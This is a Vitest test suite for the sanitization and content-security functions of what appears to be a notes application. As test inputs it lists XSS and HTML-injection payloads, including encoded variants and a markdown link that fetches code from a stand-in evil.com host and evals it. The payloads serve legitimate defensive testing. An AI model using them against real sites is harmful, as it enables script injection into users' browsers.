/**
 * Enterprise-grade security test suite
 * Tests for XSS, injection attacks, and malicious input handling
 */

import { describe, it, expect } from 'vitest'

import {
  sanitizeMarkdown,
  sanitizeClipboardContent,
  sanitizeUserInput,
  validateContentSecurity
} from '../utils/sanitization'

describe('Security Test Suite', () => {
  describe('XSS Protection', () => {
    it('should prevent script injection in markdown content', () => {
      const maliciousInput = '<script>alert("XSS")</script>**Bold text**'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).toContain('**Bold text**')
    })

    it('should remove javascript: protocols', () => {
      const maliciousInput = '[Click me](javascript:alert("XSS"))'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('alert')
    })

    it('should remove data: URLs', () => {
      const maliciousInput = '<img src="data:text/html,<script>alert(1)</script>">'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('data:')
      expect(sanitized).not.toContain('<script>')
    })

    it('should remove event handlers', () => {
      const maliciousInput = '<div onclick="alert(\'XSS\')">Content</div>'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('onclick')
      expect(sanitized).not.toContain('alert')
    })

    it('should remove dangerous HTML tags', () => {
      const maliciousInputs = [
        '<iframe src="http://evil.com"></iframe>',
        '<object data="malicious.swf"></object>',
        '<embed src="malicious.swf">',
        '<form><input type="text"></form>',
        '<style>body { display: none; }</style>'
      ]

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeMarkdown(input)
        expect(sanitized).not.toMatch(/<(iframe|object|embed|form|input|style)/i)
      })
    })
  })

  describe('Input Sanitization', () => {
    it('should enforce maximum length limits', () => {
      const longInput = 'a'.repeat(20000)
      const sanitized = sanitizeUserInput(longInput, { maxLength: 1000 })

      expect(sanitized.length).toBe(1000)
    })

    it('should escape HTML entities', () => {
      const htmlInput = '<script>alert("test")</script>'
      const sanitized = sanitizeUserInput(htmlInput)

      expect(sanitized).toBe('&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;')
    })

    it('should handle null and undefined inputs safely', () => {
      expect(sanitizeUserInput(null)).toBe('')
      expect(sanitizeUserInput(undefined)).toBe('')
      expect(sanitizeUserInput('')).toBe('')
    })

    it('should sanitize clipboard content safely', () => {
      const title = '<script>alert("title")</script>My Title'
      const content = 'Some content with <script>alert("content")</script>'

      const sanitized = sanitizeClipboardContent(title, content)

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).toContain('My Title')
      expect(sanitized).toContain('Some content')
    })
  })

  describe('Content Security Validation', () => {
    it('should detect script tags', () => {
      const maliciousContent = 'Normal text <script>alert("xss")</script> more text'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasScripts')
      expect(security.riskLevel).toBe('high')
    })

    it('should detect event handlers', () => {
      const maliciousContent = '<div onclick="maliciousFunction()">Click me</div>'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasEventHandlers')
    })

    it('should detect javascript protocols', () => {
      const maliciousContent = '<a href="javascript:alert(\'xss\')">Click</a>'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasJavascriptProtocol')
    })

    it('should detect data URLs', () => {
      const maliciousContent = '<img src="data:text/html,<script>alert(1)</script>">'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasDataUrls')
    })

    it('should allow safe content', () => {
      const safeContent = '# Title\n\nSome **bold** text with [safe link](https://example.com)'
      const security = validateContentSecurity(safeContent)

      expect(security.isSecure).toBe(true)
      expect(security.violations).toHaveLength(0)
      expect(security.riskLevel).toBe('low')
    })
  })

  // Component Security Integration tests are skipped because they require
  // rendering the Note component which depends on Konva/canvas
  // The core security functionality is already tested via unit tests above
  describe.skip('Component Security Integration', () => {
    // Tests skipped - Note component requires canvas/Konva setup
  })

  describe('Injection Attack Prevention', () => {
    const commonPayloads = [
      // XSS payloads
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '<svg onload=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>',

      // HTML injection
      '<style>body{display:none}</style>',
      '<link rel="stylesheet" href="http://evil.com/evil.css">',
      '<meta http-equiv="refresh" content="0;url=http://evil.com">',

      // Protocol handlers
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'livescript:alert(1)',

      // Event handlers
      '<div onclick="alert(1)">click</div>',
      '<button onmouseover="alert(1)">hover</button>',
      '<input onfocus="alert(1)" autofocus>'
    ]

    it.each(commonPayloads)('should neutralize payload: %s', (payload) => {
      const sanitized = sanitizeUserInput(payload)

      // Verify dangerous elements are removed/escaped
      expect(sanitized.toLowerCase()).not.toContain('<script')
      expect(sanitized.toLowerCase()).not.toContain('javascript:')
      expect(sanitized.toLowerCase()).not.toContain('data:')
      expect(sanitized.toLowerCase()).not.toContain('vbscript:')
      expect(sanitized.toLowerCase()).not.toMatch(/on\w+\s*=/)
      expect(sanitized).not.toContain('alert')
    })

    it('should handle nested and encoded attacks', () => {
      const nestedPayloads = [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src="" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
        '<<SCRIPT>alert(1)//<</SCRIPT>',
        '<script>alert(String.fromCharCode(88,83,83))</script>'
      ]

      nestedPayloads.forEach(payload => {
        const sanitized = sanitizeUserInput(payload)
        expect(sanitized.toLowerCase()).not.toContain('<script')
        expect(sanitized).not.toContain('alert')
        expect(sanitized).not.toContain('eval')
      })
    })
  })

  describe('Performance and DoS Protection', () => {
    it('should handle extremely large inputs without crashing', () => {
      const hugeInput = 'x'.repeat(1000000) // 1MB of text

      expect(() => {
        const sanitized = sanitizeUserInput(hugeInput, { maxLength: 10000 })
        expect(sanitized.length).toBe(10000)
      }).not.toThrow()
    })

    it('should handle deeply nested HTML without stack overflow', () => {
      const deeplyNested = '<div>'.repeat(1000) + 'content' + '</div>'.repeat(1000)

      expect(() => {
        const sanitized = sanitizeUserInput(deeplyNested)
        expect(sanitized).toBeDefined()
      }).not.toThrow()
    })

    it('should handle malformed HTML gracefully', () => {
      const malformedInputs = [
        '<div><span><p>unclosed tags',
        '<img src="unclosed quote>',
        '<script>var x = "</script>',
        '<<<>>><><><script>alert(1)',
        '\x00\x01\x02\x03\x04\x05'
      ]

      malformedInputs.forEach(input => {
        expect(() => {
          const sanitized = sanitizeUserInput(input)
          expect(sanitized).toBeDefined()
        }).not.toThrow()
      })
    })
  })

  describe('Regression Tests', () => {
    // These tests ensure previously fixed vulnerabilities don't return

    it('should prevent the clipboard XSS vulnerability (Issue #001)', () => {
      const maliciousTitle = '<img src=x onerror=alert("XSS in title")>'
      const maliciousContent = '<script>document.cookie="stolen"</script>'

      const sanitized = sanitizeClipboardContent(maliciousTitle, maliciousContent)

      expect(sanitized).not.toContain('<img')
      expect(sanitized).not.toContain('<script')
      expect(sanitized).not.toContain('onerror')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).not.toContain('document.cookie')
    })

    it('should prevent markdown renderer XSS (Issue #002)', () => {
      const maliciousMarkdown = '[Click me](javascript:fetch("http://evil.com").then(r=>r.text()).then(eval))'

      const sanitized = sanitizeMarkdown(maliciousMarkdown)

      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('fetch')
      expect(sanitized).not.toContain('eval')
    })
  })
})